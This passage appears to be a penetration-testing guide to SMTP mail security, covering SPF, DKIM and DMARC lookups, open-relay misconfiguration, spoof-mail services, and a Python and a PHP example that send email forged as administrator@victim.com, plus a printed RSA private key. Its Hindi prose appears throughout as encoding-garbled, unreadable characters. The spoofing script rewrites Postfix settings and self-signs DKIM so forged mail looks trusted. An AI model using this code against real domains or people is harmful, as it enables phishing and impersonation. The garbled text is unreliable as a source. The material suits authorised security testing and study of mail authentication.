_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ, рд╡рд╣рд╛рдБ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдирд╛рдо рдХреЛ рдЫрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рд╕рд╣реА/рдХреЛрдИ рднреА SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рдерд╛ред **рдЖрдЬрдХрд▓**, рдпрджрд┐ **рдИрдореЗрд▓** рдХрд┐рд╕реА **рдбреЛрдореЗрди рд╕реЗ рдЖрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реИ**, рддреЛ рдпрд╣ рд╢рд╛рдпрдж **рд╕реНрд╡рддрдГ рдЕрд╕реНрд╡реАрдХреГрдд/рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЪрд┐рд╣реНрдирд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдбреЛрдореЗрди рдХреЗ SPF рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк рдСрдирд▓рд╛рдЗрди рдЙрдкрдХрд░рдг рдЬреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM

рдбреЛрдореЗрдирдХреАрдЬреАрдп рдкрд╣рдЪрд╛рди рд╡рд╛рд▓рд╛ рдореЗрд▓ (DKIM) рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдмрд╛рд╣рд░реА рдИрдореЗрд▓ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдбреЛрдореЗрди рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдкрд░ рд╡рд┐рджреЗрд╢реА MTAs рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред DKIM рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдПрдХ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдПрдХ TXT рд░рд┐рдХреЙрд░реНрдб рдореЗрдВ рд░рдЦреА рдЬрд╛рддреА рд╣реИ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдмрд╛рдК рдФрд░ рдбреЛрдореЗрди рдирд╛рдо рджреЛрдиреЛрдВ рдХреЛ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдПред

рдлрд┐рд░, рдХреБрдВрдЬреА рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдореЗрд▓ рд╣реЗрдбрд░ `DKIM-Signature` рдХреЗ рдореЗрд▓ рдХреЗ рдЙрдмрд╛рдК рдФрд░ рдбреЛрдореЗрди рдирд╛рдо рдХреА рдорд╛рдВрдЧ рдХрд░рдиреА рд╣реЛрдЧреА, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

рдбреЛрдореЗрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрджреЗрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдФрд░ рдЕрдиреБрд░реВрдкрддрд╛ (DMARC) рдПрдХ рдореЗрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ рдЬреЛ SPF рдФрд░ DKIM рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред рдиреАрддрд┐рдпрд╛рдБ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдмрддрд╛рддреА рд╣реИрдВ рдХрд┐ рдПрдХ рджрд┐рдП рдЧрдП рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдИрдореЗрд▓ рдХреЛ рдХреИрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдХрд┐рди рдХрд╛рд░реНрд░рд╡рд╛рдИрдпреЛрдВ рдХреА рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рдиреА рд╣реИред

![](<../../.gitbook/assets/image (134).png>)

**DMARC рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЙрдк-рдбреЛрдореЗрди \_dmarc рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рдиреА рд╣реЛрдЧреА**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\;
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\;
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
PayPal рдФрд░ Yahoo рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╡реЗ рдРрд╕реЗ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ рдЬрд┐рдирдореЗрдВ рдЕрдорд╛рдиреНрдп DKIM рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣реЛрдВ рдпрд╛ рдЬреЛ рдЙрдирдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдЙрддреНрдкрдиреНрди рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрдирд╛рдПрдВ рдлрд┐рд░ рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрдЧрдарди рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдИрдореЗрд▓ рдкрддреЗ рдкрд░ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИрдВред Google рднреА рдПрдХ рд╕рдорд╛рди рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдХреНрд╡рд╛рд░рдВрдЯреАрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕реАрдзреЗ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░рддрд╛ред

#### DMARC рдЯреИрдЧ

| рдЯреИрдЧ рдирд╛рдо | рдЙрджреНрджреЗрд╢реНрдп | рдЙрджрд╛рд╣рд░рдг |
| -------- | --------- | ------- |
| v        | рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг | v=DMARC1 |
| pct      | рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╖рдпрд┐рдд рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдкреНрд░рддрд┐рд╢рдд | pct=20 |
| ruf      | рдлреЙрд░реЗрдВрд╕рд┐рдХ рд░рд┐рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI | ruf=mailto:authfail@example.com |
| rua      | рд╕рдорд╖реНрдЯрд┐ рд░рд┐рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI | rua=mailto:aggrep@example.com |
| p        | рд╕рдВрдЧрдардирд╛рддреНрдордХ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдиреАрддрд┐ | p=quarantine |
| sp       | рд╕рдВрдЧрдардирд╛рддреНрдордХ рдбреЛрдореЗрди рдХреЗ рдЙрдк-рдбреЛрдореЗрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдиреАрддрд┐ | sp=reject |
| adkim    | DKIM рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб | adkim=s |
| aspf     | SPF рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб | aspf=r |

### **рдЙрдк-рдбреЛрдореЗрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?**

**рдпрд╣рд╛рдВ рд╕реЗ** [**рдпрд╣рд╛рдВ**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
рдЖрдкрдХреЛ рдЙрди рд╕рднреА рдЙрдк-рдбреЛрдореЗрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ-рдЕрд▓рдЧ SPF рд░рд┐рдХреЙрд░реНрдб рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП рдЬрд┐рдирд╕реЗ рдЖрдк рдореЗрд▓ рднреЗрдЬрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред\
рдпрд╣ рд╢реБрд░реБрдЖрдд рдореЗрдВ openspf.org рдкрд░ рдкреЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдЗрд╕ рддрд░рд╣ рдХреА рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╣рд╛рди рд╕реНрд░реЛрдд рдерд╛ред

> рдбреЗрдорди рдкреНрд░рд╢реНрди: рдЙрдк-рдбреЛрдореЗрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛ рд╣реИ?
>
> рдЕрдЧрд░ рдореБрдЭреЗ pielovers.demon.co.uk рд╕реЗ рдореЗрд▓ рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ pielovers рдХреЗ рд▓рд┐рдП SPF рдбреЗрдЯрд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдХреНрдпрд╛ рдореИрдВ demon.co.uk рдХреЗ рд▓рд┐рдП SPF рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдЬрд╛рдКрдВ? рдирд╣реАрдВред рдбреЗрдорди рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдЙрдк-рдбреЛрдореЗрди рдПрдХ рдЕрд▓рдЧ рдЧреНрд░рд╛рд╣рдХ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрд╛рд╕ рдЕрдкрдиреА рдиреАрддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдбреЗрдорди рдХреА рдиреАрддрд┐ рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рднреА рдЧреНрд░рд╛рд╣рдХреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛; рдЕрдЧрд░ рдбреЗрдорди рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рдЙрдк-рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП SPF рд░рд┐рдХреЙрд░реНрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
>
> рдЗрд╕рд▓рд┐рдП SPF рдкреНрд░рдХрд╛рд╢рдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд▓рд╛рд╣ рдпрд╣ рд╣реИ: рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЙрдк-рдбреЛрдореЗрди рдпрд╛ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ SPF рд░рд┐рдХреЙрд░реНрдб рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ A рдпрд╛ MX рд░рд┐рдХреЙрд░реНрдб рд╣реЛред
>
> рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб A рдпрд╛ MX рд░рд┐рдХреЙрд░реНрдб рд╡рд╛рд▓реА рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рднреА рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб SPF рд░рд┐рдХреЙрд░реНрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ: \* IN TXT "v=spf1 -all"

рдпрд╣ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ - рдПрдХ рдЙрдк-рдбреЛрдореЗрди рдмрд╣реБрдд рд╣реА рдЕрд▓рдЧ-рдЕрд▓рдЧ рднреМрдЧреЛрд▓рд┐рдХ рд╕реНрдерд╛рди рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреА SPF рдкрд░рд┐рднрд╛рд╖рд╛ рдмрд╣реБрдд рдЕрд▓рдЧ рд╣реЛ рд╕рдХрддреА рд╣реИред

### **рдЦреБрд▓рд╛ рд░рд┐рд▓реЗ**

рд╕реНрдкреИрдо рдлрд╝рд┐рд▓реНрдЯрд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЬрд╛рдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ **рд░рд┐рд▓реЗ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЕрдХреНрд╕рд░, рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕ **рдЖрдИрдкреА** рд░реЗрдВрдЬ рдХреА **рдЕрдиреБрдорддрд┐ рджреЗрдиреА** рд╣реИред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдо рдЖрдЙрдЯрд░ рдФрд░ рдЗрдВрдЯрд░рдирд▓ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯ рдореЗрдВ рдЕрдХреНрд╕рд░ рдРрд╕реЗ SMTP рд╕рд░реНрд╡рд░ рдХреА рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдкрд╛рдПрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, рд╡реЗ рд╕рднреА рдЖрдИрдкреА рдкрддреЛрдВ рдХреА **рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдИрдореЗрд▓ рдЯреНрд░реИрдлрд╝рд┐рдХ рдореЗрдВ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рди рд╣реЛрдВ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХреЛ рдмрд╛рдзрд┐рдд рдпрд╛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд░реБрдХрд╛рд╡рдЯ рди рд╣реЛред
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **рдЙрдкрдХрд░рдг**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF рдФрд░ DMARC рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **рдСрдЯреЛрдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ SPF рдФрд░ DMARC рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

### рд╕реНрдкреВрдлрд╝ рдИрдореЗрд▓ рднреЗрдЬреЗрдВ

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)\*\*\*\*

**рдпрд╛ рдЖрдк рдПрдХ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)\*\*\*\*
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **dkim python lib** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдХрд┐рд╕реА рднреА **рддреНрд░реБрдЯрд┐ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдХреБрдВрдЬреА рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВред\
**рдиреЛрдЯ**: рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдЬрд▓реНрджреА рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЧрдВрджрд╛ рдареАрдХ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ openssl рдирд┐рдЬреА рдХреБрдВрдЬреА **dkim рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**рдпрд╛ рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># рдпрд╣ рдПрдХ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдЧрд╛
</strong><strong>mail("your_email@gmail.com", "рдкрд░реАрдХреНрд╖рдг рд╡рд┐рд╖рдп!", "рд╣реЗрд▓реЛ! рдпрд╣ рдПрдХ рдкрд░реАрдХреНрд╖рдг рд╣реИ", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

**рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **рдкрд░ рдЬрд╛рдПрдВред**

### **рдЕрдиреНрдп рдлрд┐рд╢рд┐рдВрдЧ рд╕рдВрдХреЗрдд**

* рдбреЛрдореЗрди рдХреА рдЙрдореНрд░
* IP рдкрддреЗ рдХреА рдУрд░ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд▓рд┐рдВрдХ
* рд▓рд┐рдВрдХ рдореЗрдВ рдмрджрд▓рд╛рд╡ рдХрд░рдиреЗ рдХреА рддрдХрдиреАрдХреЗрдВ
* рд╕рдВрджрд┐рдЧреНрдз (рдЕрд╕рд╛рдорд╛рдиреНрдп) рдЕрдЯреИрдЪрдореЗрдВрдЯреНрд╕
* рдЯреВрдЯреА рд╣реБрдИ рдИрдореЗрд▓ рд╕рд╛рдордЧреНрд░реА
* рдореЗрд▓ рд╣реЗрдбрд░реНрд╕ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рди
* рдорд╛рдиреНрдп рдФрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп SSL рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдореМрдЬреВрджрдЧреА
* рдкреГрд╖реНрда рдХреЛ рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рд╕рд╛рдЗрдЯреЛрдВ рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдирд╛

## SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА

**рдпрджрд┐ рдЖрдк SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** [**рдЗрд╕реЗ рдкрдврд╝реЗрдВ**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**ред**

## рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓

### Postfix

рдЖрдорддреМрд░ рдкрд░, рдпрджрд┐ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, `/etc/postfix/master.cf` рдореЗрдВ **рдРрд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ** рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЬрдм рдПрдХ рдирдпрд╛ рдореЗрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкрдВрдХреНрддрд┐ `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдирдпрд╛ рдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рддреЛ `/etc/postfix/filtering` 